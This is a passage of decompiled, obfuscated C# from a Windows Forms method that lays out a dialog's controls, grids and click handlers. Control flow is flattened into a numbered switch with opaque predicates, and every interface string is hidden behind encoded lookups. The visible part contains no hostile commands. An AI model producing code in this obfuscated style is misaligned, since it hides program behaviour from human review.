              this._VisitorComparator.AutoSizeMode = DataGridViewAutoSizeColumnMode.ColumnHeader;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 231;
                continue;
              }
              goto case 260;
            case 21:
              this._Policy.TabIndex = 4;
              if (true)
              {
                num2 = 204;
                continue;
              }
              goto case 56;
            case 22:
              this.dic.Controls.Add((Control) this._Listener);
              num2 = 25;
              continue;
            case 23:
              goto label_55;
            case 24:
              this._Listener.Name = RoleValueFilter.RestartVisitor(3844);
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 158;
                continue;
              }
              goto label_169;
            case 25:
              goto label_1;
            case 26:
              goto label_152;
            case 27:
              this.advisor = new Button();
              int num3 = 239;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 28:
              this._Producer.TabStop = false;
              this._Producer.Text = RoleValueFilter.RestartVisitor(4416);
              if (true)
              {
                num2 = 244;
                continue;
              }
              goto case 36;
            case 29:
              this.stubComparator.Text = RoleValueFilter.RestartVisitor(5470);
              if (true)
              {
                num2 = 176;
                continue;
              }
              goto label_95;
            case 30:
              goto label_267;
            case 31:
              goto label_284;
            case 32:
              goto label_128;
            case 33:
              goto label_149;
            case 34:
              this._Producer.Controls.Add((Control) this.m_Exception);
              num2 = 269;
              continue;
            case 35:
              this._Manager.SuspendLayout();
              num2 = 241;
              continue;
            case 36:
              this.prototypeComparator.Text = RoleValueFilter.RestartVisitor(5632);
              if (true)
              {
                num2 = 233;
                continue;
              }
              goto label_36;
            case 37:
              goto label_157;
            case 38:
              ((ISupportInitialize) this.m_Mapper).EndInit();
              if (true)
              {
                num2 = 153;
                continue;
              }
              goto label_105;
            case 39:
              this.m_Service.Name = RoleValueFilter.RestartVisitor(3676);
              this.m_Service.Size = new Size(71, 23);
              num2 = 136;
              continue;
            case 40:
              goto label_160;
            case 41:
              goto label_254;
            case 42:
              goto label_132;
            case 43:
              goto label_36;
            case 44:
              goto label_87;
            case 45:
              this._Issuer.AllowUserToAddRows = false;
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 46;
                continue;
              }
              goto label_145;
            case 46:
              goto label_155;
            case 47:
              goto label_74;
            case 48:
              this.m_Initializer.ResumeLayout(false);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 111;
                continue;
              }
              goto case 169;
            case 49:
              goto label_100;
            case 50:
              goto label_45;
            case 51:
              goto label_193;
            case 52:
              goto label_44;
            case 53:
              goto label_107;
            case 54:
              this.m_Test.DividerWidth = 1;
              if (true)
              {
                num2 = 207;
                continue;
              }
              goto label_137;
            case 55:
              this._Rules.Text = RoleValueFilter.RestartVisitor(5024);
              this.specification.Location = new Point(233, 15);
              this.specification.Name = RoleValueFilter.RestartVisitor(5064);
              this.specification.Size = new Size(47, 23);
              this.specification.TabIndex = 2;
              num2 = 224;
              continue;
            case 56:
              this.m_Initializer.Size = new Size(286, 50);
              this.m_Initializer.TabIndex = 6;
              if (true)
              {
                num2 = 216;
                continue;
              }
              goto label_177;
            case 57:
              goto label_283;
            case 58:
              goto label_31;
            case 59:
              goto label_7;
            case 60:
              goto label_72;
            case 61:
              this._Base = new Label();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 217;
                continue;
              }
              goto case 110;
            case 62:
            case 194:
              this.m_Proc.AutoSizeMode = DataGridViewAutoSizeColumnMode.ColumnHeader;
              if (true)
              {
                num2 = 200;
                continue;
              }
              goto label_295;
            case 63:
              this.m_Writer.Size = new Size(48, 17);
              num2 = 65;
              continue;
            case 64:
              goto label_24;
            case 65:
              goto label_198;
            case 66:
              this.Controls.Add((Control) this.order);
              this.Controls.Add((Control) this.dic);
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 115;
                continue;
              }
              goto case 22;
            case 67:
              goto label_131;
            case 68:
              goto label_240;
            case 69:
              goto label_81;
            case 70:
              goto label_91;
            case 71:
              goto label_148;
            case 72:
              this.dic.TabStop = false;
              this.dic.Text = RoleValueFilter.RestartVisitor(3558);
              if (true)
              {
                num2 = 18;
                continue;
              }
              goto case 185;
            case 73:
              goto label_119;
            case 74:
              this.m_Expression.UseVisualStyleBackColor = true;
              num2 = 122;
              continue;
            case 75:
              this._Manager.Name = RoleValueFilter.RestartVisitor(4676);
              num2 = 209;
              continue;
            case 76:
              goto label_222;
            case 77:
              goto label_172;
            case 78:
              this._Broadcaster.TabIndex = 2;
              if (true)
              {
                num2 = 121;
                continue;
              }
              goto case 136;
            case 79:
              goto label_291;
            case 80:
              this.regComparator.TabIndex = 0;
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 271;
                continue;
              }
              goto label_179;
            case 81:
              this.dic.Location = new Point(0, 449);
              if (true)
              {
                num2 = 279;
                continue;
              }
              goto label_89;
            case 82:
              goto label_188;
            case 83:
              this._Base.Location = new Point(6, 517);
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 94;
                continue;
              }
              goto label_52;
            case 84:
              this._Wrapper.AutoSize = true;
              num2 = 270;
              continue;
            case 85:
              goto label_167;
            case 86:
              goto label_113;
            case 87:
              goto label_272;
            case 88:
              goto label_163;
            case 89:
              this.m_Instance.Location = new Point(244, 44);
              if (true)
              {
                num2 = 31;
                continue;
              }
              goto label_279;
            case 90:
              goto label_110;
            case 91:
              goto label_130;
            case 92:
              goto label_269;
            case 93:
              this.schemaComparator.UseVisualStyleBackColor = true;
              this.schemaComparator.Click += new EventHandler(this.UpdateComparator);
              this.prototypeComparator.AutoSize = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 159;
                continue;
              }
              goto case 135;
            case 94:
              this._Base.Name = RoleValueFilter.RestartVisitor(5420);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 149;
                continue;
              }
              goto case 118;
            case 95:
              goto label_154;
            case 96:
              this.regComparator = new RichTextBox();
              this._PublisherComparator = new Button();
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 100;
                continue;
              }
              goto label_232;
            case 97:
              goto label_227;
            case 98:
              this._Parameter.AutoSize = true;
              if (true)
              {
                num2 = 252;
                continue;
              }
              goto case 29;
            case 99:
              this.stubComparator.Controls.Add((Control) this.schemaComparator);
              this.stubComparator.Controls.Add((Control) this.prototypeComparator);
              num2 = 185;
              continue;
            case 100:
              this.schemaComparator = new Button();
              this.prototypeComparator = new Label();
              int num4 = 73;
              num2 = GetterStrategyConnector.StopInfo() ? num4 : num4;
              continue;
            case 101:
              goto label_248;
            case 102:
              this.m_Service.Text = RoleValueFilter.RestartVisitor(3708);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 259;
                continue;
              }
              goto label_107;
            case 103:
              goto label_170;
            case 104:
              this.m_Initializer.Location = new Point(423, 393);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 105;
                continue;
              }
              goto case 38;
            case 105:
              goto label_212;
            case 106:
              goto label_57;
            case 107:
              this.MaximizeBox = false;
              this.Name = RoleValueFilter.RestartVisitor(5696);
              this.Text = RoleValueFilter.RestartVisitor(5720);
              if (true)
              {
                num2 = 212;
                continue;
              }
              goto label_245;
            case 108:
              this.m_Mapper.TabIndex = 3;
              num2 = 293;
              continue;
            case 109:
              this.m_Writer.Location = new Point(12, 19);
              this.m_Writer.Name = RoleValueFilter.RestartVisitor(5374);
              num2 = 63;
              continue;
            case 110:
              this._Getter.Size = new Size(16, 17);
              num2 = 88;
              continue;
            case 111:
              this.m_Initializer.PerformLayout();
              if (true)
              {
                num2 = 51;
                continue;
              }
              goto case 122;
            case 112:
              goto label_90;
            case 113:
              goto label_43;
            case 114:
              this.advisor.TabIndex = 10;
              num2 = 103;
              continue;
            case 115:
              goto label_204;
            case 116:
              goto label_205;
            case 117:
              this.order.TabStop = false;
              num2 = 16;
              continue;
            case 118:
              this._Producer.SuspendLayout();
              if (true)
              {
                num2 = 23;
                continue;
              }
              goto label_126;
            case 119:
              goto label_137;
            case 120:
              goto label_213;
            case 121:
              this._Broadcaster.Text = RoleValueFilter.RestartVisitor(4232);
              num2 = 232;
              continue;
            case 122:
              this.m_Expression.Click += new EventHandler(this.CountComparator);
              num2 = 268;
              continue;
            case 123:
              goto label_28;
            case 124:
              goto label_116;
            case 125:
              goto label_121;
            case 126:
              goto label_211;
            case (int) sbyte.MaxValue:
              this._ComparatorComparator = new DataGridViewTextBoxColumn();
              this._VisitorComparator = new DataGridViewTextBoxColumn();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 226;
                continue;
              }
              goto case 20;
            case 128:
              goto label_22;
            case 129:
              goto label_161;
            case 130:
              goto label_228;
            case 131:
              this.stubComparator.TabIndex = 8;
              if (true)
              {
                num2 = 8;
                continue;
              }
              goto case 287;
            case 132:
              goto label_208;
            case 133:
              goto label_223;
            case 134:
              goto label_277;
            case 135:
              this.recordComparator.ReadOnly = true;
              this._ComparatorComparator.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
              this._ComparatorComparator.DividerWidth = 1;
              this._ComparatorComparator.HeaderText = RoleValueFilter.RestartVisitor(4306);
              this._ComparatorComparator.Name = RoleValueFilter.RestartVisitor(4564);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 70;
                continue;
              }
              goto label_291;
            case 136:
              this.m_Service.TabIndex = 11;
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 102;
                continue;
              }
              goto case 28;
            case 137:
              goto label_19;
            case 138:
              goto label_156;
            case 139:
              goto label_123;
            case 140:
              goto label_92;
            case 141:
              this.m_Service.Click += new EventHandler(this.RemoveComparator);
              num2 = 130;
              continue;
            case 142:
              goto label_279;
            case 143:
              this._Listener.TabIndex = 7;
              this._Collection.AutoSize = true;
              num2 = 288;
              continue;
            case 144:
              goto label_47;
            case 145:
              this.m_Composer.Text = RoleValueFilter.RestartVisitor(5308);
              this.m_Composer.UseVisualStyleBackColor = true;
              int num5 = 84;
              num2 = GetterStrategyConnector.StopInfo() ? num5 : num5;
              continue;
            case 146:
              this._Parameter.TabIndex = 8;
              this._Parameter.Text = RoleValueFilter.RestartVisitor(3820);
              this._Listener.Location = new Point(58, 17);
              if (true)
              {
                num2 = 24;
                continue;
              }
              goto case 104;
            case 147:
              this.watcher.UseVisualStyleBackColor = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 276;
                continue;
              }
              goto label_185;
            case 148:
              goto label_38;
            case 149:
              goto label_210;
            case 150:
              goto label_120;
            case 151:
              goto label_230;
            case 152:
              this.global.Size = new Size(101, 20);
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 292;
                continue;
              }
              goto label_227;
            case 153:
              goto label_52;
            case 154:
              goto label_232;
            case 155:
              this.stubComparator.Controls.Add((Control) this.regComparator);
              num2 = 219;
              continue;
            case 156:
              goto label_150;
            case 157:
              this.stubComparator.Name = RoleValueFilter.RestartVisitor(5440);
              num2 = 235;
              continue;
            case 158:
              goto label_70;
            case 159:
              goto label_202;
            case 160:
              goto label_242;
            case 161:
              goto label_185;
            case 162:
              goto label_39;
            case 163:
              goto label_49;
            case 164:
              goto label_241;
            case 165:
              this.prototypeComparator.Size = new Size(101, 13);
              if (true)
              {
                num2 = 144;
                continue;
              }
              goto case 93;
            case 166:
              this._Printer.TabIndex = 9;
              if (true)
              {
                num2 = 192;
                continue;
              }
              goto label_130;
            case 167:
              this._Setter.TabIndex = 1;
              if (true)
              {
                num2 = 291;
                continue;
              }
              goto label_256;
            case 168:
              this.specification.UseVisualStyleBackColor = true;
              if (true)
              {
                num2 = 249;
                continue;
              }
              goto case (int) sbyte.MaxValue;
            case 169:
              this._ResolverComparator.HeaderText = RoleValueFilter.RestartVisitor(4290);
              num2 = 67;
              continue;
            case 171:
              goto label_257;
            case 172:
              goto label_273;
            case 173:
              goto label_218;
            case 174:
              this._Connection.Name = RoleValueFilter.RestartVisitor(3976);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 125;
                continue;
              }
              goto label_62;
            case 175:
              goto label_276;
            case 176:
              goto label_126;
            case 177:
              goto label_114;
            case 178:
              goto label_186;
            case 179:
              this.specification = new Button();
              this._Setter = new Label();
              if (true)
              {
                num2 = 116;
                continue;
              }
              goto label_123;
            case 180:
              this.m_Composer.Size = new Size(48, 17);
              if (true)
              {
                num2 = 15;
                continue;
              }
              goto label_65;
            case 181:
              this._Connection = new Button();
              this.m_Product = new TextBox();
              if (true)
              {
                num2 = 132;
                continue;
              }
              goto label_31;
            case 182:
              goto label_146;
            case 183:
              goto label_275;
            case 184:
              this.m_Creator.Text = RoleValueFilter.RestartVisitor(3444);
              this._Getter.Name = RoleValueFilter.RestartVisitor(3472);
              num2 = 110;
              continue;
            case 185:
              this.stubComparator.Controls.Add((Control) this.m_ValueComparator);
              this.stubComparator.Location = new Point(422, 0);
              num2 = 157;
              continue;
            case 186:
              this._Parameter = new Label();
              this._Listener = new TextBox();
              if (true)
              {
                num2 = 210;
                continue;
              }
              goto label_272;
            case 187:
              this.m_Exception.CellClick += new DataGridViewCellEventHandler(this.ForgotComparator);
              if (true)
              {
                num2 = 32;
                continue;
              }
              goto label_283;
            case 188:
              goto label_274;
            case 189:
              goto label_6;
            case 190:
              this._ContextComparator.Width = 105;
              if (true)
              {
                num2 = 34;
                continue;
              }
              goto label_182;
            case 191:
              goto label_3;
            case 192:
              this._Printer.UseSystemPasswordChar = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 98;
                continue;
              }
              goto label_74;
            case 193:
              goto label_20;
            case 195:
              this._Issuer.Size = new Size(401, 62);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 281;
                continue;
              }
              goto case 168;
            case 196:
              goto label_285;
            case 197:
              this.m_Creator.Name = RoleValueFilter.RestartVisitor(3444);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 246;
                continue;
              }
              goto label_252;
            case 198:
              this.m_Instance.Text = RoleValueFilter.RestartVisitor(3922);
              num2 = 253;
              continue;
            case 199:
              this._PublisherComparator.UseVisualStyleBackColor = true;
              if (true)
              {
                num2 = 119;
                continue;
              }
              goto case 12;
            case 200:
              goto label_21;
            case 201:
              this._Manager.Controls.Add((Control) this.m_Mapper);
              this._Manager.Location = new Point(423, 174);
              num2 = 75;
              continue;
            case 202:
              this._ContextComparator.ReadOnly = true;
              if (true)
              {
                num2 = 190;
                continue;
              }
              goto case 147;
            case 203:
              goto label_252;
            case 204:
              goto label_78;
            case 205:
              goto label_4;
            case 206:
              this.m_ValueComparator.Name = RoleValueFilter.RestartVisitor(5672);
              this.m_ValueComparator.Size = new Size(274, 52);
              this.m_ValueComparator.TabIndex = 1;
              if (true)
              {
                num2 = 87;
                continue;
              }
              goto case 242;
            case 207:
              goto label_261;
            case 208:
              goto label_134;
            case 209:
              this._Manager.Size = new Size(286, 156);
              if (true)
              {
                num2 = 205;
                continue;
              }
              goto label_47;
            case 210:
              goto label_270;
            case 211:
              goto label_302;
            case 212:
              this.FormClosing += new FormClosingEventHandler(this.PatchComparator);
              this.m_Creator.ResumeLayout(false);
              this.m_Creator.PerformLayout();
              if (true)
              {
                num2 = 148;
                continue;
              }
              goto label_159;
            case 213:
              this._Broadcaster.Click += new EventHandler(this.TestComparator);
              if (true)
              {
                num2 = 45;
                continue;
              }
              goto case 270;
            case 214:
              this.Controls.Add((Control) this._Manager);
              this.FormBorderStyle = FormBorderStyle.FixedDialog;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 107;
                continue;
              }
              goto label_204;
            case 215:
              this._Collection.Name = RoleValueFilter.RestartVisitor(3872);
              if (true)
              {
                num2 = 295;
                continue;
              }
              goto case 66;
            case 216:
              goto label_58;
            case 217:
              goto label_263;
            case 218:
              this.PerformLayout();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 299;
                continue;
              }
              goto case 174;
            case 219:
              goto label_98;
            case 220:
              goto label_96;
            case 221:
              this.m_Exception.TabIndex = 2;
              if (true)
              {
                num2 = 187;
                continue;
              }
              goto case 35;
            case 222:
              goto label_189;
            case 223:
              goto label_111;
            case 224:
              goto label_14;
            case 225:
              this._Task.Location = new Point(6, 20);
              int num6 = 0;
              num2 = GetterStrategyConnector.StopInfo() ? num6 : num6;
              continue;
            case 226:
              this._Manager = new GroupBox();
              this.m_Mapper = new DataGridView();
              if (true)
              {
                num2 = 245;
                continue;
              }
              goto label_54;
            case 227:
              goto label_179;
            case 228:
              goto label_59;
            case 229:
              this.dic.PerformLayout();
              num2 = 163;
              continue;
            case 230:
              goto label_48;
            case 231:
              this._VisitorComparator.HeaderText = RoleValueFilter.RestartVisitor(4322);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 128;
                continue;
              }
              goto label_72;
            case 232:
              this._Broadcaster.UseVisualStyleBackColor = true;
              num2 = 213;
              continue;
            case 233:
              goto label_253;
            case 234:
              goto label_200;
            case 235:
              this.stubComparator.Size = new Size(286, 330);
              num2 = 131;
              continue;
            case 236:
              this.m_Exception.Size = new Size(274, 143);
              num2 = 221;
              continue;
            case 237:
              this._Base.AutoSize = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 83;
                continue;
              }
              goto label_198;
            case 238:
              goto label_23;
            case 239:
              goto label_95;
            case 240:
              goto label_162;
            case 241:
              goto label_177;
            case 242:
              this.watcher.Text = RoleValueFilter.RestartVisitor(3618);
              if (true)
              {
                num2 = 147;
                continue;
              }
              goto case 195;
            case 243:
              goto label_201;
            case 244:
              goto label_135;
            case 245:
              goto label_62;
            case 246:
              goto label_159;
            case 247:
              this.m_Exception.Columns.AddRange((DataGridViewColumn) this.recordComparator, (DataGridViewColumn) this._ComparatorComparator, (DataGridViewColumn) this._VisitorComparator);
              this.m_Exception.Location = new Point(6, 19);
              this.m_Exception.Name = RoleValueFilter.RestartVisitor(4472);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 283;
                continue;
              }
              goto case 253;
            case 248:
              goto label_258;
            case 249:
              goto label_182;
            case 250:
              goto label_65;
            case 251:
              goto label_245;
            case 252:
              this._Parameter.Location = new Point(217, 20);
              if (true)
              {
                num2 = 82;
                continue;
              }
              goto case 14;
            case 253:
              this._Policy.AutoSize = true;
              this._Policy.Location = new Point(6, 41);
              if (true)
              {
                num2 = 260;
                continue;
              }
              goto label_261;
            case 254:
              goto label_256;
            case (int) byte.MaxValue:
              this.m_Writer.AutoSize = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 109;
                continue;
              }
              goto case 290;
            case 256:
              goto label_40;
            case 257:
              goto label_25;
            case 258:
              this.dic = new GroupBox();
              this.watcher = new CheckBox();
              num2 = 188;
              continue;
            case 259:
              goto label_26;
            case 260:
              this._Policy.Name = RoleValueFilter.RestartVisitor(3938);
              this._Policy.Size = new Size(51, 13);
              num2 = 21;
              continue;
            case 261:
              this.m_Proc = new DataGridViewButtonColumn();
              num2 = 77;
              continue;
            case 262:
              this.dic.Controls.Add((Control) this.m_Product);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 4;
                continue;
              }
              goto label_210;
            case 263:
              goto label_229;
            case 264:
              goto label_99;
            case 265:
              this.m_Mapper.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
              this.m_Mapper.Columns.AddRange((DataGridViewColumn) this.importer, (DataGridViewColumn) this.m_Test, (DataGridViewColumn) this.m_Proc);
              this.m_Mapper.Location = new Point(6, 19);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 76;
                continue;
              }
              goto case 11;
            case 266:
              goto label_151;
            case 267:
              goto label_266;
            case 268:
              this.order.Controls.Add((Control) this._Broadcaster);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 139;
                continue;
              }
              goto label_148;
            case 269:
              goto label_190;
            case 270:
              this._Wrapper.Checked = true;
              int num7 = 284;
              num2 = GetterStrategyConnector.StopInfo() ? num7 : num7;
              continue;
            case 271:
              goto label_221;
            case 272:
              goto label_127;
            case 273:
              goto label_295;
            case 274:
              this._Wrapper.TabStop = true;
              if (true)
              {
                num2 = 41;
                continue;
              }
              goto label_110;
            case 275:
              goto label_219;
            case 276:
              goto label_97;
            case 277:
              goto label_12;
            case 278:
              goto label_13;
            case 279:
              this.dic.Name = RoleValueFilter.RestartVisitor(3518);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 287;
                continue;
              }
              goto case 117;
            case 280:
              this.m_Instance = new Label();
              int num8 = 154;
              num2 = GetterStrategyConnector.StopInfo() ? num8 : num8;
              continue;
            case 281:
              this._Issuer.TabIndex = 1;
              this._ResolverComparator.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
              int num9 = 286;
              num2 = GetterStrategyConnector.StopInfo() ? num9 : num9;
              continue;
            case 282:
              goto label_138;
            case 283:
              goto label_117;
            case 284:
              this._Wrapper.Location = new Point(66, 20);
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 150;
                continue;
              }
              goto label_193;
            case 285:
              goto label_249;
            case 286:
              this._ResolverComparator.DividerWidth = 1;
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 169;
                continue;
              }
              goto label_172;
            case 287:
              this.dic.Size = new Size(709, 65);
              if (true)
              {
                num2 = 191;
                continue;
              }
              goto case 62;
            case 288:
              goto label_108;
            case 289:
              goto label_79;
            case 290:
              this.m_Instance.Size = new Size(32, 13);
              this.m_Instance.TabIndex = 5;
              if (true)
              {
                num2 = 198;
                continue;
              }
              goto label_248;
            case 291:
              goto label_169;
            case 292:
              goto label_145;
            case 293:
              this.m_Mapper.CellContentClick += new DataGridViewCellEventHandler(this.PopComparator);
              if (true)
              {
                num2 = 137;
                continue;
              }
              goto label_78;
            case 294:
              goto label_166;
            case 295:
              goto label_27;
            case 296:
              this.order = new GroupBox();
              this._Broadcaster = new Button();
              this._Issuer = new DataGridView();
              this._ResolverComparator = new DataGridViewTextBoxColumn();
              if (true)
              {
                num2 = 264;
                continue;
              }
              goto label_3;
            case 297:
              this._FieldComparator = new System.Windows.Forms.Timer(this._Tests);
              this.m_Creator.SuspendLayout();
              int num10 = 2;
              num2 = GetterStrategyConnector.StopInfo() ? num10 : num10;
              continue;
            case 298:
              this.importer.HeaderText = RoleValueFilter.RestartVisitor(4290);
              if (true)
              {
                num2 = 12;
                continue;
              }
              goto label_57;
            case 299:
              goto label_281;
            default:
              goto label_10;
          }
        }
label_1:
        this.dic.Controls.Add((Control) this._Collection);
        this.dic.Controls.Add((Control) this.m_Instance);
        num1 = 134;
        continue;
label_3:
        this.dic.TabIndex = 1;
        num1 = 72;
        continue;
label_4:
        this._Manager.TabIndex = 4;
        num1 = 112;
        continue;
label_6:
        this.dic.Controls.Add((Control) this._Connection);
        num1 = 262;
        continue;
label_7:
        this._RegistryComparator.HeaderText = RoleValueFilter.RestartVisitor(4306);
        this._RegistryComparator.Name = RoleValueFilter.RestartVisitor(4306);
        goto label_248;
label_10:
        num1 = 101;
        continue;
label_12:
        this.m_Proc.SortMode = DataGridViewColumnSortMode.Automatic;
        this.m_Proc.Width = 57;
        num1 = 79;
        continue;
label_13:
        this.advisor.Name = RoleValueFilter.RestartVisitor(3728);
        num1 = 256;
        continue;
label_14:
        this.specification.Text = RoleValueFilter.RestartVisitor(4924);
        num1 = 168;
        continue;
label_18:
        this.m_Initializer.Controls.Add((Control) this.m_Composer);
        this.m_Initializer.Controls.Add((Control) this._Wrapper);
        num1 = 230;
        continue;
label_19:
        this.importer.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
        this.importer.DividerWidth = 1;
        num1 = 298;
        continue;
label_20:
        this._Code = new Button();
        num1 = 227;
        continue;
label_21:
        this.m_Proc.HeaderText = RoleValueFilter.RestartVisitor(4924);
        this.m_Proc.Name = RoleValueFilter.RestartVisitor(4938);
        num1 = 222;
        continue;
label_22:
        this._VisitorComparator.Name = RoleValueFilter.RestartVisitor(4620);
        num1 = 7;
        continue;
label_23:
        this.m_Test.Name = RoleValueFilter.RestartVisitor(4868);
        this.m_Test.ReadOnly = true;
        this.m_Test.Resizable = DataGridViewTriState.True;
        num1 = 272;
        continue;
label_24:
        this.dic.Controls.Add((Control) this._Printer);
        this.dic.Controls.Add((Control) this._Parameter);
        num1 = 22;
        continue;
label_25:
        this.m_Exception.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        num1 = 236;
        continue;
label_26:
        this.m_Service.UseVisualStyleBackColor = true;
        num1 = 141;
        continue;
label_27:
        this._Collection.Size = new Size(39, 13);
        this._Collection.TabIndex = 6;
        num1 = 60;
        continue;
label_28:
        this._Connection.Text = RoleValueFilter.RestartVisitor(4012);
        num1 = 140;
        continue;
label_31:
        this.m_Expression.Name = RoleValueFilter.RestartVisitor(4090);
        this.m_Expression.Size = new Size(71, 23);
        num1 = 251;
        continue;
label_36:
        this._Task.TabIndex = 0;
        num1 = 13;
        continue;
label_38:
        this.dic.ResumeLayout(false);
        num1 = 229;
        continue;
label_39:
        this.m_Creator.Location = new Point(0, 535);
        num1 = 197;
        continue;
label_40:
        this.advisor.Size = new Size(72, 23);
        num1 = 114;
        continue;
label_43:
        this.regComparator.Size = new Size(273, 220);
        num1 = 80;
        continue;
label_44:
        this.schemaComparator.Size = new Size(47, 23);
        this.schemaComparator.TabIndex = 3;
        num1 = 1;
        continue;
label_45:
        this.ResumeLayout(false);
        num1 = 218;
        continue;
label_47:
        this.prototypeComparator.TabIndex = 2;
        num1 = 36;
        continue;
label_48:
        this.m_Initializer.Controls.Add((Control) this.m_Writer);
        num1 = 104;
        continue;
label_49:
        this.global.EndInit();
        this.order.ResumeLayout(false);
        num1 = 171;
        continue;
label_52:
        this._Rules.ResumeLayout(false);
        num1 = 44;
        continue;
label_54:
        this.m_Creator = new StatusStrip();
        num1 = 14;
        continue;
label_55:
        ((ISupportInitialize) this.m_Exception).BeginInit();
        num1 = 35;
        continue;
label_57:
        this.watcher.TabIndex = 13;
        num1 = 242;
        continue;
label_58:
        this.m_Initializer.TabStop = false;
        num1 = 294;
        continue;
label_59:
        this.m_Product.Text = RoleValueFilter.RestartVisitor(4068);
        num1 = 90;
        continue;
label_62:
        this.importer = new DataGridViewTextBoxColumn();
        this.m_Test = new DataGridViewButtonColumn();
        num1 = 261;
        continue;
label_65:
        this.watcher.Location = new Point(389, 19);
        num1 = 71;
        continue;
label_70:
        this._Listener.Size = new Size(122, 20);
        num1 = 143;
        continue;
label_72:
        this._Collection.Text = RoleValueFilter.RestartVisitor(3888);
        this.m_Instance.AutoSize = true;
        num1 = 89;
        continue;
label_74:
        this.AutoScaleMode = AutoScaleMode.Font;
        num1 = 17;
        continue;
label_78:
        this._Policy.Text = RoleValueFilter.RestartVisitor(3954);
        this._Connection.Location = new Point(631, 39);
        num1 = 174;
        continue;
label_79:
        this.m_Product.TabIndex = 1;
        num1 = 228;
        continue;
label_81:
        this.prototypeComparator.Name = RoleValueFilter.RestartVisitor(5616);
        num1 = 165;
        continue;
label_87:
        this._Rules.PerformLayout();
        num1 = 48;
        continue;
label_89:
        this._VisitorComparator.ReadOnly = true;
        this._VisitorComparator.Width = 101;
        num1 = 201;
        continue;
label_90:
        this._Manager.TabStop = false;
        this._Manager.Text = RoleValueFilter.RestartVisitor(4714);
        this.m_Mapper.AllowUserToAddRows = false;
        this.m_Mapper.AllowUserToDeleteRows = false;
        num1 = 265;
        continue;
label_91:
        this._ComparatorComparator.ReadOnly = true;
        num1 = 20;
        continue;
label_92:
        this._Connection.UseVisualStyleBackColor = true;
        this._Connection.Click += new EventHandler(this.RestartComparator);
        num1 = 53;
        continue;
label_95:
        this._Printer = new TextBox();
        num1 = 186;
        continue;
label_96:
        this._Rules.Size = new Size(286, 51);
        num1 = 240;
        continue;
label_97:
        this.global.Location = new Point(278, 39);
        this.global.Maximum = new Decimal(new int[4]
        {
          10000,
          0,
          0,
          0
        });
        num1 = 57;
        continue;
label_98:
        this.stubComparator.Controls.Add((Control) this._PublisherComparator);
        num1 = 99;
        continue;
label_99:
        this._RegistryComparator = new DataGridViewTextBoxColumn();
        this._ContextComparator = new DataGridViewTextBoxColumn();
        num1 = 138;
        continue;
label_100:
        this.m_Creator.Items.AddRange(new ToolStripItem[1]
        {
          (ToolStripItem) this._Getter
        });
        num1 = 162;
        continue;
label_105:
        this.importer.ReadOnly = true;
        num1 = 3;
        continue;
label_107:
        this.m_Product.Location = new Point(58, 38);
        this.m_Product.Name = RoleValueFilter.RestartVisitor(4036);
        num1 = 26;
        continue;
label_108:
        this._Collection.Location = new Point(18, 20);
        num1 = 215;
        continue;
label_110:
        this.m_Expression.Location = new Point(553, 39);
        num1 = 58;
        continue;
label_111:
        this._Wrapper.TabIndex = 1;
        num1 = 274;
        continue;
label_113:
        this.schemaComparator.Location = new Point(7, 301);
        this.schemaComparator.Name = RoleValueFilter.RestartVisitor(5574);
        num1 = 52;
        continue;
label_114:
        this.recordComparator.HeaderText = RoleValueFilter.RestartVisitor(4290);
        this.recordComparator.Name = RoleValueFilter.RestartVisitor(4508);
        num1 = 135;
        continue;
label_116:
        this._Issuer.Name = RoleValueFilter.RestartVisitor(4254);
        this._Issuer.ReadOnly = true;
        this._Issuer.RowHeadersVisible = false;
        num1 = 42;
        continue;
label_117:
        this.m_Exception.ReadOnly = true;
        this.m_Exception.RowHeadersVisible = false;
        num1 = 257;
        continue;
label_118:
        this.order.Text = RoleValueFilter.RestartVisitor(4176);
        num1 = 196;
        continue;
label_119:
        this.m_ValueComparator = new TextBox();
        num1 = 297;
        continue;
label_120:
        this._Wrapper.Name = RoleValueFilter.RestartVisitor(5320);
        this._Wrapper.Size = new Size(58, 17);
        num1 = 223;
        continue;
label_121:
        this._Connection.Size = new Size(71, 23);
        this._Connection.TabIndex = 3;
        num1 = 123;
        continue;
label_123:
        this.order.Controls.Add((Control) this._Issuer);
        this.order.Location = new Point(0, 0);
        this.order.Name = RoleValueFilter.RestartVisitor(4138);
